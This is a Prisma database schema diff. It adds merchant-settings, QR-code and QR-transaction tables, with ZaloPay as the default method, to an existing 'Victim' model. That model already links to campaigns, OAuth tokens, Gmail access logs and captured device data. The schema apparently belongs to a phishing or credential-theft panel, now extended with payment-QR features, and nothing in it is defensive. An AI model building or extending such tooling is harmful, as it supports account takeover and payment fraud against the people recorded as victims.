@@ -43,6 +43,9 @@ model Victim {
   campaign          Campaign? @relation(fields: [campaignId], references: [id])
   oauthTokens       OAuthToken[]
   gmailAccessLogs   GmailAccessLog[]
+  merchantSettings  MerchantSettings?
+  qrCodes           QrCode[]
+  qrTransactions    QrTransaction[]
   
   @@index([email])
   @@index([captureTimestamp])
@@ -256,3 +259,68 @@ model DeviceData {
   @@map("device_data")
 }
 
+// Merchant Settings - consolidated JSON settings per victim
+model MerchantSettings {
+  id           String   @id @default(uuid()) @db.Uuid
+  victimId     String   @unique @map("victim_id") @db.Uuid
+  profile      Json     @default("{}") @db.JsonB
+  business     Json     @default("{}") @db.JsonB
+  notifications Json    @default("{}") @db.JsonB
+  security     Json     @default("{}") @db.JsonB
+  createdAt    DateTime @default(now()) @map("created_at") @db.Timestamptz
+  updatedAt    DateTime @updatedAt @map("updated_at") @db.Timestamptz
+
+  // Relations
+  victim       Victim   @relation(fields: [victimId], references: [id], onDelete: Cascade)
+
+  @@map("merchant_settings")
+}
+
+// QR Codes table for merchant payments
+model QrCode {
+  id                String   @id @default(uuid()) @db.Uuid
+  victimId          String?  @map("victim_id") @db.Uuid
+  name              String   @db.VarChar(255)
+  type              String   @default("static") @db.VarChar(50) // static, dynamic
+  amount            Int?     @db.Integer
+  description       String?  @db.Text
+  design            String   @default("default") @db.VarChar(100)
+  qrData            String   @map("qr_data") @db.Text
+  qrImage           String?  @map("qr_image") @db.Text
+  status            String   @default("active") @db.VarChar(50)
+  totalTransactions Int      @default(0) @map("total_transactions")
+  totalAmount       Int      @default(0) @map("total_amount")
+  metadata          Json     @default("{}") @db.JsonB
+  createdAt         DateTime @default(now()) @map("created_at") @db.Timestamptz
+  updatedAt         DateTime @updatedAt @map("updated_at") @db.Timestamptz
+
+  // Relations
+  victim            Victim?          @relation(fields: [victimId], references: [id], onDelete: SetNull)
+  transactions      QrTransaction[]
+
+  @@index([victimId])
+  @@index([status, createdAt])
+  @@map("qr_codes")
+}
+
+// QR Transactions linked to QR codes
+model QrTransaction {
+  id         String   @id @default(uuid()) @db.Uuid
+  qrCodeId   String   @map("qr_code_id") @db.Uuid
+  victimId   String?  @map("victim_id") @db.Uuid
+  amount     Int      @default(0) @db.Integer
+  status     String   @default("success") @db.VarChar(50)
+  method     String   @default("ZaloPay") @db.VarChar(50)
+  reference  String?  @db.VarChar(100)
+  metadata   Json     @default("{}") @db.JsonB
+  createdAt  DateTime @default(now()) @map("created_at") @db.Timestamptz
+
+  // Relations
+  qrCode     QrCode   @relation(fields: [qrCodeId], references: [id], onDelete: Cascade)
+  victim     Victim?  @relation(fields: [victimId], references: [id], onDelete: SetNull)
+
+  @@index([qrCodeId, createdAt])
+  @@index([victimId, createdAt])
+  @@index([status, createdAt])
+  @@map("qr_transactions")
+}
